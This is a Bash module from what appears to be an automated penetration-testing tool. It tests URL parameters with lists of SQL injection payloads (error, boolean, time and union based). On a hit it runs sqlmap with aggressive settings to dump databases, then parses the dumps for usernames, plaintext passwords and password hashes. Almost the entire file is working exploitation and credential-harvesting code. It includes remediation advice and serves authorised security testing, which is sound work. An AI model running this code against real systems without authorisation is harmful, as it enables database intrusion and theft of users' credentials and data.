#!/bin/bash

# SQL Injection Testing Module
# Tests for Error-based, Boolean-based, Time-based, and Union-based SQLi

source "$(dirname "${BASH_SOURCE[0]}")/../../core/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../../core/database.sh"

# Main SQLi testing function
test_sqli() {
    local url=$1
    local project_id=$2

    log_info "Testing SQL Injection on $url"

    # Test error-based SQLi first (fastest detection)
    if test_error_based_sqli "$url" "$project_id"; then
        # If error-based found, launch SQLMap for full exploitation
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    # Test boolean-based blind SQLi
    if test_boolean_based_sqli "$url" "$project_id"; then
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    # Test time-based blind SQLi (slowest, run last)
    if test_time_based_sqli "$url" "$project_id"; then
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    # Test union-based SQLi
    if test_union_based_sqli "$url" "$project_id"; then
        test_sqli_with_sqlmap "$url" "$project_id"
        return 0
    fi

    log_debug "[SQLi] No SQL injection vulnerabilities detected"
    return 1
}

# Test error-based SQL injection
test_error_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Error-based SQL Injection"

    # Error-based payloads for different databases
    local payloads=(
        "'"
        "''"
        "\""
        "1' OR '1'='1"
        "1' OR '1'='1' --"
        "1' OR '1'='1' /*"
        "1' OR '1'='1' #"
        "' OR 1=1--"
        "' OR 1=1#"
        "' OR 1=1/*"
        "admin' --"
        "admin' #"
        "admin'/*"
        "' OR 'x'='x"
        "' OR 'a'='a"
        "1' AND '1'='2"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "' UNION SELECT NULL,NULL,NULL--"
        # MySQL specific
        "' AND 1=CONVERT(int, (SELECT @@version))--"
        "' AND 1=CONVERT(int, (SELECT user()))--"
        # PostgreSQL specific
        "' AND 1=CAST((SELECT version()) AS int)--"
        # MSSQL specific
        "' AND 1=CONVERT(int, @@version)--"
        # Oracle specific
        "' AND 1=CAST(banner AS number) FROM v\$version WHERE rownum=1--"
    )

    # SQL error patterns for different databases
    local error_patterns=(
        # Generic
        "sql"
        "mysql"
        "postgresql"
        "postgres"
        "oracle"
        "microsoft"
        "odbc"
        "jdbc"
        "syntax error"
        "syntax near"
        "unexpected"
        "warning"
        # MySQL
        "You have an error in your SQL syntax"
        "mysql_fetch"
        "mysql_num_rows"
        "mysqli"
        "mysql_query"
        # PostgreSQL
        "pg_query"
        "pg_exec"
        "ERROR.*syntax"
        "unterminated quoted string"
        # MSSQL
        "Microsoft SQL"
        "ODBC SQL Server Driver"
        "SQLServer JDBC Driver"
        "Unclosed quotation mark"
        # Oracle
        "ORA-[0-9]"
        "Oracle error"
        "quoted string not properly terminated"
    )

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        # Test common parameter names
        local common_params=("id" "page" "pid" "category" "user" "userid" "item" "product")
        for param in "${common_params[@]}"; do
            if test_sqli_parameter_error "$url" "$param" "$project_id" "${payloads[@]}"; then
                return 0
            fi
        done
    else
        # Test each parameter
        while read -r param; do
            if test_sqli_parameter_error "$url" "$param" "$project_id" "${payloads[@]}"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test SQLi on specific parameter (error-based)
test_sqli_parameter_error() {
    local base_url=$1
    local param=$2
    local project_id=$3
    shift 3
    local payloads=("$@")

    log_debug "[SQLi] Testing parameter for errors: $param"

    for payload in "${payloads[@]}"; do
        # Build test URL
        local test_url=$(build_test_url "$base_url" "$param" "$payload")

        # Send request
        local response=$(curl -s -L --max-time 10 \
                         -A "Mozilla/5.0" \
                         -w "\n---HTTP_CODE:%{http_code}---" \
                         "$test_url" 2>/dev/null)

        local body=$(echo "$response" | sed -n '1,/---HTTP_CODE:/p' | head -n -1)
        local http_code=$(echo "$response" | grep -o "---HTTP_CODE:[0-9]*" | cut -d: -f2)

        # Check for SQL errors
        local error_found=""
        local detected_db=""

        # MySQL errors
        if echo "$body" | grep -qiE "mysql|You have an error in your SQL syntax"; then
            error_found="yes"
            detected_db="MySQL"
        # PostgreSQL errors
        elif echo "$body" | grep -qiE "postgresql|postgres|pg_|ERROR.*syntax"; then
            error_found="yes"
            detected_db="PostgreSQL"
        # MSSQL errors
        elif echo "$body" | grep -qiE "Microsoft SQL|ODBC SQL Server|SQLServer JDBC"; then
            error_found="yes"
            detected_db="Microsoft SQL Server"
        # Oracle errors
        elif echo "$body" | grep -qiE "ORA-[0-9]|Oracle"; then
            error_found="yes"
            detected_db="Oracle"
        # Generic SQL errors
        elif echo "$body" | grep -qiE "sql.*error|syntax.*error|database.*error"; then
            error_found="yes"
            detected_db="Unknown SQL Database"
        fi

        if [ -n "$error_found" ]; then
            log_critical "[SQLi] Error-based SQL Injection found in parameter '$param'!"

            # Extract actual error message
            local error_msg=$(echo "$body" | grep -ioE "(mysql|postgresql|oracle|sql).*error[^<]*" | head -1)

            db_add_finding "$project_id" "critical" "sqli_error_based" \
                "SQL Injection - Error Based (${detected_db})" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\nDatabase Type: $detected_db\n\nSQL error message detected in response:\n$error_msg\n\nThis indicates the application is vulnerable to SQL injection attacks." \
                "" "9.8" \
                "1. Use prepared statements (parameterized queries) - the ONLY effective defense\n2. Use stored procedures (with proper parameter handling)\n3. Input validation and sanitization as secondary defense\n4. Escape all user input\n5. Use least privilege database accounts\n6. Disable detailed error messages in production\n7. Implement WAF rules for SQL injection patterns"

            # Save evidence
            save_sqli_evidence "$project_id" "$test_url" "$payload" "$body" "error_based"

            return 0
        fi
    done

    return 1
}

# Test boolean-based blind SQL injection
test_boolean_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Boolean-based Blind SQL Injection"

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("id" "page" "pid")
        for param in "${common_params[@]}"; do
            if test_boolean_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_boolean_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test boolean SQLi on specific parameter
test_boolean_sqli_param() {
    local base_url=$1
    local param=$2
    local project_id=$3

    log_debug "[SQLi] Testing boolean-based SQLi on parameter: $param"

    # Get baseline response (true condition)
    local baseline_url=$(build_test_url "$base_url" "$param" "1")
    local baseline_response=$(curl -s -L --max-time 10 "$baseline_url")
    local baseline_length=${#baseline_response}

    # Test true condition (should return same as baseline)
    local true_payload="1 AND 1=1"
    local true_url=$(build_test_url "$base_url" "$param" "$true_payload")
    local true_response=$(curl -s -L --max-time 10 "$true_url")
    local true_length=${#true_response}

    # Test false condition (should return different response)
    local false_payload="1 AND 1=2"
    local false_url=$(build_test_url "$base_url" "$param" "$false_payload")
    local false_response=$(curl -s -L --max-time 10 "$false_url")
    local false_length=${#false_response}

    # Calculate similarity
    local true_diff=$((baseline_length - true_length))
    local false_diff=$((baseline_length - false_length))

    # Make differences absolute
    [ $true_diff -lt 0 ] && true_diff=$((-true_diff))
    [ $false_diff -lt 0 ] && false_diff=$((-false_diff))

    # If true condition similar to baseline, but false condition very different
    if [ $true_diff -lt 100 ] && [ $false_diff -gt 500 ]; then
        log_success "[SQLi] Boolean-based Blind SQL Injection found in parameter '$param'!"

        db_add_finding "$project_id" "critical" "sqli_boolean_blind" \
            "SQL Injection - Boolean-based Blind" \
            "URL: $base_url\nParameter: $param\n\nTrue payload: $true_payload\nTrue response length: $true_length\n\nFalse payload: $false_payload\nFalse response length: $false_length\n\nBaseline length: $baseline_length\n\nThe application returns different responses for TRUE and FALSE SQL conditions, indicating boolean-based blind SQL injection vulnerability." \
            "" "9.5" \
            "1. Use prepared statements (parameterized queries)\n2. Implement proper input validation\n3. Use ORM frameworks with proper configuration\n4. Apply principle of least privilege for database accounts"

        save_sqli_evidence "$project_id" "$true_url" "$true_payload" "$true_response" "boolean_blind"

        return 0
    fi

    return 1
}

# Test time-based blind SQL injection
test_time_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Time-based Blind SQL Injection (this may take a while)"

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("id" "page" "pid")
        for param in "${common_params[@]}"; do
            if test_time_based_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_time_based_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test time-based SQLi on specific parameter
test_time_based_sqli_param() {
    local base_url=$1
    local param=$2
    local project_id=$3

    log_debug "[SQLi] Testing time-based SQLi on parameter: $param"

    # Get baseline response time
    local start=$(date +%s)
    curl -s -L --max-time 15 "$(build_test_url "$base_url" "$param" "1")" > /dev/null
    local end=$(date +%s)
    local baseline_time=$((end - start))

    log_debug "[SQLi] Baseline response time: ${baseline_time}s"

    # Time-based payloads for different databases (5 second delay)
    local delay=5
    local payloads=(
        # MySQL
        "1' AND SLEEP($delay)--"
        "1' AND SLEEP($delay)#"
        "1 AND SLEEP($delay)"
        # PostgreSQL
        "1' AND pg_sleep($delay)--"
        "1 AND pg_sleep($delay)"
        # MSSQL
        "1' WAITFOR DELAY '0:0:$delay'--"
        "1 WAITFOR DELAY '0:0:$delay'"
        # Oracle
        "1' AND DBMS_LOCK.SLEEP($delay)--"
        # Generic
        "1' AND (SELECT * FROM (SELECT(SLEEP($delay)))a)--"
    )

    for payload in "${payloads[@]}"; do
        log_debug "[SQLi] Testing time payload: $payload"

        local test_url=$(build_test_url "$base_url" "$param" "$payload")

        local start=$(date +%s)
        curl -s -L --max-time 15 "$test_url" > /dev/null 2>&1
        local end=$(date +%s)
        local response_time=$((end - start))

        log_debug "[SQLi] Response time with payload: ${response_time}s"

        # If response time is significantly longer (within 1 second of expected delay)
        local expected_time=$((baseline_time + delay))
        local time_diff=$((response_time - expected_time))
        [ $time_diff -lt 0 ] && time_diff=$((-time_diff))

        if [ $response_time -ge $((delay - 1)) ] && [ $time_diff -le 2 ]; then
            log_critical "[SQLi] Time-based Blind SQL Injection found in parameter '$param'!"

            # Determine database type from payload
            local db_type="Unknown"
            [[ "$payload" == *"SLEEP"* ]] && db_type="MySQL"
            [[ "$payload" == *"pg_sleep"* ]] && db_type="PostgreSQL"
            [[ "$payload" == *"WAITFOR"* ]] && db_type="Microsoft SQL Server"
            [[ "$payload" == *"DBMS_LOCK"* ]] && db_type="Oracle"

            db_add_finding "$project_id" "critical" "sqli_time_blind" \
                "SQL Injection - Time-based Blind (${db_type})" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\n\nBaseline response time: ${baseline_time}s\nPayload response time: ${response_time}s\nExpected delay: ${delay}s\n\nThe application response is delayed when time-based SQL injection payloads are injected, confirming blind SQL injection vulnerability." \
                "" "9.3" \
                "1. Use prepared statements (parameterized queries) - the PRIMARY defense\n2. Use stored procedures with parameter binding\n3. Implement input validation\n4. Use ORM frameworks correctly\n5. Monitor and alert on slow queries\n6. Apply principle of least privilege"

            save_sqli_evidence "$project_id" "$test_url" "$payload" "Time-based response: ${response_time}s" "time_blind"

            return 0
        fi
    done

    return 1
}

# Test union-based SQL injection
test_union_based_sqli() {
    local url=$1
    local project_id=$2

    log_info "[SQLi] Testing Union-based SQL Injection"

    # Extract parameters
    local params=$(extract_url_parameters "$url")

    if [ -z "$params" ]; then
        local common_params=("id" "page" "pid" "category" "user")
        for param in "${common_params[@]}"; do
            if test_union_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done
    else
        while read -r param; do
            if test_union_sqli_param "$url" "$param" "$project_id"; then
                return 0
            fi
        done <<< "$params"
    fi

    return 1
}

# Test union-based SQLi on specific parameter
test_union_sqli_param() {
    local base_url=$1
    local param=$2
    local project_id=$3

    log_debug "[SQLi] Testing union-based SQLi on parameter: $param"

    # Step 1: Determine number of columns using ORDER BY
    local max_columns=20
    local column_count=0

    for i in $(seq 1 $max_columns); do
        local order_payload="1 ORDER BY $i--"
        local test_url=$(build_test_url "$base_url" "$param" "$order_payload")

        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)
        local http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for errors indicating column limit exceeded
        if echo "$response" | grep -qiE "unknown column|error|incorrect|syntax|column.*not"; then
            column_count=$((i - 1))
            log_debug "[SQLi] Detected $column_count columns"
            break
        fi
    done

    # If we couldn't determine column count, try NULL method
    if [ $column_count -eq 0 ]; then
        for i in $(seq 1 10); do
            local nulls=$(printf "NULL," | head -c $((i*5)) | sed 's/,$//')
            local union_payload="' UNION SELECT $nulls--"
            local test_url=$(build_test_url "$base_url" "$param" "$union_payload")

            local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)
            local http_code=$(curl -s -o /dev/null -w "%{http_code}" -L --max-time 10 "$test_url" 2>/dev/null)

            # Check if successful (no errors)
            if [ "$http_code" = "200" ] && ! echo "$response" | grep -qiE "error|syntax|column"; then
                column_count=$i
                log_debug "[SQLi] Detected $column_count columns using UNION NULL method"
                break
            fi
        done
    fi

    if [ $column_count -eq 0 ]; then
        log_debug "[SQLi] Could not determine column count for union injection"
        return 1
    fi

    # Step 2: Test UNION SELECT with data extraction
    # Build NULL columns string with one position for data extraction
    local union_payloads=()

    for pos in $(seq 1 $column_count); do
        local nulls=""
        for i in $(seq 1 $column_count); do
            if [ $i -eq $pos ]; then
                # Test different database-specific queries at this position
                nulls="${nulls}@@version,"     # MySQL/MSSQL
                union_payloads+=("' UNION SELECT ${nulls%,}--")
                nulls="${nulls%@@version,}version(),"   # MySQL
                union_payloads+=("' UNION SELECT ${nulls%,}--")
                nulls="${nulls%version(),}user(),"      # MySQL
                union_payloads+=("' UNION SELECT ${nulls%,}--")
                nulls="${nulls%user(),}database(),"     # MySQL
                union_payloads+=("' UNION SELECT ${nulls%,}--")
                nulls="${nulls%database(),}current_user,"  # PostgreSQL
                union_payloads+=("' UNION SELECT ${nulls%,}--")

                # Reset to NULL for next iteration
                nulls="${nulls%current_user,}NULL,"
            else
                nulls="${nulls}NULL,"
            fi
        done
    done

    # Test each payload
    for payload in "${union_payloads[@]}"; do
        local test_url=$(build_test_url "$base_url" "$param" "$payload")
        local response=$(curl -s -L --max-time 10 "$test_url" 2>/dev/null)

        # Check for database version strings or user info
        if echo "$response" | grep -qiE "mysql|mariadb|postgresql|postgres|microsoft|oracle|sqlite|5\.[0-9]\.[0-9]|8\.0\.|10\.[0-9]|root@|admin@"; then
            log_critical "[SQLi] Union-based SQL Injection found in parameter '$param'!"

            # Extract visible database info from response
            local db_info=$(echo "$response" | grep -ioE "(mysql|mariadb|postgresql|microsoft).*[0-9]\.[0-9]" | head -1)
            [ -z "$db_info" ] && db_info="Database information extracted"

            # Detect database type
            local db_type="Unknown"
            if echo "$response" | grep -qiE "mysql|mariadb"; then
                db_type="MySQL/MariaDB"
            elif echo "$response" | grep -qiE "postgresql|postgres"; then
                db_type="PostgreSQL"
            elif echo "$response" | grep -qiE "microsoft|mssql"; then
                db_type="Microsoft SQL Server"
            elif echo "$response" | grep -qiE "oracle"; then
                db_type="Oracle"
            fi

            db_add_finding "$project_id" "critical" "sqli_union_based" \
                "SQL Injection - Union-based" \
                "URL: $test_url\nParameter: $param\nPayload: $payload\nDatabase Type: $db_type\nColumns: $column_count\n\nDatabase Information Extracted:\n$db_info\n\nThe application is vulnerable to UNION-based SQL injection, allowing direct data extraction from the database through UNION SELECT queries." \
                "" "9.8" \
                "CRITICAL - IMMEDIATE ACTION REQUIRED:\n1. Use prepared statements (parameterized queries) - the PRIMARY defense\n2. Never concatenate user input into SQL queries\n3. Use ORM frameworks with proper configuration\n4. Implement input validation as secondary defense\n5. Apply principle of least privilege for database accounts\n6. Disable detailed error messages\n7. Monitor database access logs for unauthorized queries\n8. Consider WAF rules for UNION SELECT patterns"

            save_sqli_evidence "$project_id" "$test_url" "$payload" "$response" "union_based"

            return 0
        fi
    done

    return 1
}

# Full exploitation with SQLMap
test_sqli_with_sqlmap() {
    local url=$1
    local project_id=$2

    # Check if sqlmap is installed
    if ! command -v sqlmap &> /dev/null; then
        log_warn "[SQLi] SQLMap not installed, skipping automated exploitation"
        return 1
    fi

    log_info "[SQLi] Launching SQLMap for deep exploitation"

    local output_dir="data/projects/${project_id}/scans/sqlmap_$(date +%s)"
    mkdir -p "$output_dir"

    # Run SQLMap with aggressive settings
    sqlmap -u "$url" \
           --batch \
           --level=5 \
           --risk=3 \
           --dbms=all \
           --technique=BEUSTQ \
           --threads=5 \
           --random-agent \
           --tamper=space2comment \
           --output-dir="$output_dir" \
           --dump-format=CSV \
           2>&1 | tee "${output_dir}/sqlmap_output.txt"

    # Parse SQLMap results
    if [ -f "${output_dir}/sqlmap_output.txt" ]; then
        parse_sqlmap_results "$project_id" "${output_dir}/sqlmap_output.txt"
    fi
}

# Parse SQLMap output
parse_sqlmap_results() {
    local project_id=$1
    local output_file=$2

    log_info "[SQLi] Parsing SQLMap results"

    # Check if file exists
    if [ ! -f "$output_file" ]; then
        log_warn "[SQLi] SQLMap output file not found: $output_file"
        return 1
    fi

    # Extract database type
    local db_type=$(grep -oP "back-end DBMS: \K.*" "$output_file" | head -1)
    [ -n "$db_type" ] && log_info "[SQLi] Detected DBMS: $db_type"

    # Extract current user
    local current_user=$(grep -oP "current user:\s*'\K[^']*" "$output_file" | head -1)
    [ -n "$current_user" ] && log_info "[SQLi] Current user: $current_user"

    # Extract current database
    local current_db=$(grep -oP "current database:\s*'\K[^']*" "$output_file" | head -1)
    [ -n "$current_db" ] && log_info "[SQLi] Current database: $current_db"

    # Check if user is DBA
    local is_dba=$(grep -oP "current user is DBA:\s*\K(True|False)" "$output_file" | head -1)
    [ "$is_dba" = "True" ] && log_critical "[SQLi] Current user has DBA privileges!"

    # Extract databases list
    local databases=$(awk '/available databases/,/^$/' "$output_file" | grep -E '^\[.\]' | sed 's/\[.\] //' | tr '\n' ', ')
    if [ -n "$databases" ]; then
        log_success "[SQLi] Databases found: ${databases%, }"
    fi

    # Extract tables
    local tables_count=$(grep -c "Database:.*Table:" "$output_file" 2>/dev/null || echo "0")
    [ "$tables_count" -gt 0 ] && log_info "[SQLi] Found $tables_count tables"

    # Parse dumped data from CSV files
    local output_dir=$(dirname "$output_file")
    if [ -d "${output_dir}/dump" ]; then
        log_info "[SQLi] Parsing dumped data from CSV files"
        parse_sqlmap_csv_dumps "$project_id" "${output_dir}/dump"
    fi

    # Check if data was dumped
    if grep -q "dumped to CSV file\|entries retrieved\|dumped table" "$output_file"; then
        log_critical "[SQLi] SQLMap successfully dumped database contents!"

        # Count dumped entries
        local entries=$(grep -oP "dumped \K\d+(?= entries)" "$output_file" | awk '{s+=$1} END {print s}')
        [ -z "$entries" ] && entries="unknown number of"

        db_add_finding "$project_id" "critical" "sqli_data_exfiltration" \
            "SQL Injection - Data Exfiltration Successful" \
            "Database Type: $db_type\nCurrent User: $current_user\nCurrent Database: $current_db\nDBA Privileges: $is_dba\n\nDatabases found: $databases\nTables discovered: $tables_count\nEntries dumped: $entries\n\nSQLMap successfully extracted data from the database.\n\nFull output: $output_file\nDumped data: ${output_dir}/dump/" \
            "" "10.0" \
            "IMMEDIATE ACTION REQUIRED:\n1. Take affected system offline\n2. Patch SQL injection vulnerability using prepared statements\n3. Change all database credentials immediately\n4. Audit logs for unauthorized access\n5. Assess data breach scope\n6. Review dumped data for sensitive information\n7. Consider incident response procedures\n8. Notify affected parties if PII was exposed"
    fi

    # Extract credentials from output
    parse_sqlmap_credentials "$project_id" "$output_file"

    # Parse hashes
    parse_sqlmap_hashes "$project_id" "$output_file"
}

# Parse credentials from CSV dumps
parse_sqlmap_csv_dumps() {
    local project_id=$1
    local dump_dir=$2

    if [ ! -d "$dump_dir" ]; then
        return 1
    fi

    log_debug "[SQLi] Searching for credentials in CSV dumps"

    # Find CSV files containing potential credential data
    find "$dump_dir" -name "*.csv" 2>/dev/null | while read -r csv_file; do
        # Look for files with common credential table names
        local filename=$(basename "$csv_file")

        if echo "$filename" | grep -qiE "user|admin|account|login|auth|member|customer|password"; then
            log_info "[SQLi] Analyzing credential table: $filename"

            # Parse CSV (skip header, extract username and password columns)
            # Try to detect column positions
            local header=$(head -1 "$csv_file")
            local user_col=0
            local pass_col=0
            local hash_col=0

            # Find username column
            if echo "$header" | grep -qiE "username|user_name|login|email"; then
                user_col=$(echo "$header" | tr ',' '\n' | grep -niE "username|user_name|login|email" | head -1 | cut -d: -f1)
            fi

            # Find password column
            if echo "$header" | grep -qiE "password|pass|pwd"; then
                pass_col=$(echo "$header" | tr ',' '\n' | grep -niE "password|pass|pwd" | head -1 | cut -d: -f1)
            fi

            # Find hash column
            if echo "$header" | grep -qiE "hash"; then
                hash_col=$(echo "$header" | tr ',' '\n' | grep -niE "hash" | head -1 | cut -d: -f1)
            fi

            # Parse rows
            tail -n +2 "$csv_file" | while IFS=',' read -r -a columns; do
                local username=""
                local password=""
                local hash=""

                # Extract based on detected columns
                [ $user_col -gt 0 ] && username="${columns[$((user_col-1))]}"
                [ $pass_col -gt 0 ] && password="${columns[$((pass_col-1))]}"
                [ $hash_col -gt 0 ] && hash="${columns[$((hash_col-1))]}"

                # Add to database if found
                if [ -n "$username" ] && [ -n "$password" ]; then
                    db_add_credential "$project_id" "$username" "$password" "SQLMap extraction from $filename"
                    log_success "[SQLi] Credential from CSV: $username"
                fi

                if [ -n "$username" ] && [ -n "$hash" ]; then
                    db_add_credential "$project_id" "$username" "" "$hash" "SQLMap hash from $filename"
                    log_success "[SQLi] Hash from CSV: $username (hash: ${hash:0:20}...)"
                fi
            done
        fi
    done
}

# Parse credentials from SQLMap text output
parse_sqlmap_credentials() {
    local project_id=$1
    local output_file=$2

    log_debug "[SQLi] Parsing credentials from SQLMap output"

    # Method 1: Parse table format (| username | password |)
    grep -E "\|.*\|.*\|" "$output_file" | while read -r line; do
        # Skip header lines
        if echo "$line" | grep -qE "^\+\-\-\-|username|user|login|Table:|Database:"; then
            continue
        fi

        # Extract fields
        local fields=$(echo "$line" | tr '|' '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$')
        local field_count=$(echo "$fields" | wc -l)

        # If we have at least 2 fields, try to extract username/password
        if [ $field_count -ge 2 ]; then
            local field1=$(echo "$fields" | sed -n '1p')
            local field2=$(echo "$fields" | sed -n '2p')

            # Check if fields look like credentials (non-empty, reasonable length)
            if [ -n "$field1" ] && [ -n "$field2" ] && [ ${#field1} -lt 100 ] && [ ${#field2} -lt 200 ]; then
                # Check if field2 looks like a password or hash
                if [ ${#field2} -ge 4 ]; then
                    # Check if it's a hash (hex, base64, or starts with $)
                    if echo "$field2" | grep -qE '^(\$|[a-f0-9]{32,}|[A-Za-z0-9+/]{20,}=*)$'; then
                        # It's likely a hash
                        db_add_credential "$project_id" "$field1" "" "$field2" "SQLMap extraction (hash)"
                        log_success "[SQLi] Hash extracted: $field1 (${field2:0:20}...)"
                    else
                        # It's likely a plaintext password
                        db_add_credential "$project_id" "$field1" "$field2" "" "SQLMap extraction"
                        log_success "[SQLi] Credential extracted: $field1"
                    fi
                fi
            fi
        fi
    done

    # Method 2: Parse named output (e.g., "admin:password123")
    grep -E "^\[.*\]\s*[a-zA-Z0-9_.-]+:[^:]{4,}" "$output_file" | while read -r line; do
        local creds=$(echo "$line" | grep -oE '[a-zA-Z0-9_.-]+:[^[:space:]]+')
        if [ -n "$creds" ]; then
            local username=$(echo "$creds" | cut -d: -f1)
            local password=$(echo "$creds" | cut -d: -f2-)

            if [ -n "$username" ] && [ -n "$password" ]; then
                db_add_credential "$project_id" "$username" "$password" "" "SQLMap extraction"
                log_success "[SQLi] Credential extracted: $username"
            fi
        fi
    done
}

# Parse password hashes from SQLMap
parse_sqlmap_hashes() {
    local project_id=$1
    local output_file=$2

    log_debug "[SQLi] Parsing password hashes from SQLMap output"

    # Look for common hash patterns
    # MD5: 32 hex chars
    # SHA1: 40 hex chars
    # SHA256: 64 hex chars
    # bcrypt: starts with $2a$, $2b$, $2y$
    # Unix crypt: starts with $1$, $5$, $6$

    # Extract lines containing hash-like patterns
    grep -E '(\$[0-9][a-z]?\$|[a-f0-9]{32,64})' "$output_file" | while read -r line; do
        # Skip lines that are clearly not hashes
        if echo "$line" | grep -qiE "table|database|column|sqlmap|INFO|WARNING|ERROR"; then
            continue
        fi

        # Extract MD5 hashes (32 hex chars)
        echo "$line" | grep -oE '\b[a-f0-9]{32}\b' | while read -r hash; do
            log_info "[SQLi] Found MD5 hash: $hash"
            db_add_credential "$project_id" "unknown" "" "$hash" "SQLMap hash extraction (MD5)"
        done

        # Extract SHA1 hashes (40 hex chars)
        echo "$line" | grep -oE '\b[a-f0-9]{40}\b' | while read -r hash; do
            log_info "[SQLi] Found SHA1 hash: $hash"
            db_add_credential "$project_id" "unknown" "" "$hash" "SQLMap hash extraction (SHA1)"
        done

        # Extract SHA256 hashes (64 hex chars)
        echo "$line" | grep -oE '\b[a-f0-9]{64}\b' | while read -r hash; do
            log_info "[SQLi] Found SHA256 hash: $hash"
            db_add_credential "$project_id" "unknown" "" "$hash" "SQLMap hash extraction (SHA256)"
        done

        # Extract bcrypt/crypt hashes
        echo "$line" | grep -oE '\$[0-9][a-z]?\$[^\s]+' | while read -r hash; do
            log_info "[SQLi] Found crypt hash: ${hash:0:30}..."
            db_add_credential "$project_id" "unknown" "" "$hash" "SQLMap hash extraction (crypt)"
        done
    done

    # Check if hash file was saved by SQLMap
    local output_dir=$(dirname "$output_file")
    if [ -f "${output_dir}/hashes.txt" ]; then
        log_success "[SQLi] Found SQLMap hash file: ${output_dir}/hashes.txt"

        while read -r line; do
            # Format: username:hash
            if echo "$line" | grep -qE '^[a-zA-Z0-9_.-]+:'; then
                local username=$(echo "$line" | cut -d: -f1)
                local hash=$(echo "$line" | cut -d: -f2-)

                if [ -n "$username" ] && [ -n "$hash" ]; then
                    db_add_credential "$project_id" "$username" "" "$hash" "SQLMap hash file"
                    log_success "[SQLi] Hash from file: $username"
                fi
            fi
        done < "${output_dir}/hashes.txt"
    fi
}

# Helper: Build test URL with parameter
build_test_url() {
    local base_url=$1
    local param=$2
    local value=$3

    # URL encode value
    local encoded_value=$(urlencode "$value")

    if [[ "$base_url" == *"?"* ]]; then
        if [[ "$base_url" == *"$param="* ]]; then
            # Replace existing parameter
            echo "$base_url" | sed "s/$param=[^&]*/$param=$encoded_value/"
        else
            # Add new parameter
            echo "${base_url}&${param}=${encoded_value}"
        fi
    else
        # Add first parameter
        echo "${base_url}?${param}=${encoded_value}"
    fi
}

# Helper: Extract URL parameters
extract_url_parameters() {
    local url=$1

    if [[ "$url" != *"?"* ]]; then
        return 1
    fi

    local query_string="${url#*\?}"
    echo "$query_string" | tr '&' '\n' | cut -d= -f1
}

# Helper: URL encode
urlencode() {
    local string="$1"
    local strlen=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<strlen ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9] ) o="${c}" ;;
            * ) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done

    echo "$encoded"
}

# Helper: Save SQLi evidence
save_sqli_evidence() {
    local project_id=$1
    local url=$2
    local payload=$3
    local response=$4
    local type=$5

    local evidence_dir="data/projects/${project_id}/evidence/sqli"
    mkdir -p "$evidence_dir"

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local evidence_file="${evidence_dir}/sqli_${type}_${timestamp}.txt"

    cat > "$evidence_file" <<EOF
SQL Injection Evidence - ${type}
URL: $url
Payload: $payload
Captured: $(date)

Response:
$response
EOF

    log_debug "[SQLi] Evidence saved to: $evidence_file"
}

# Export functions
export -f test_sqli
export -f test_error_based_sqli
export -f test_boolean_based_sqli
export -f test_time_based_sqli
export -f test_union_based_sqli
export -f test_union_sqli_param
export -f test_sqli_with_sqlmap
export -f parse_sqlmap_results
export -f parse_sqlmap_credentials
export -f parse_sqlmap_hashes
export -f parse_sqlmap_csv_dumps
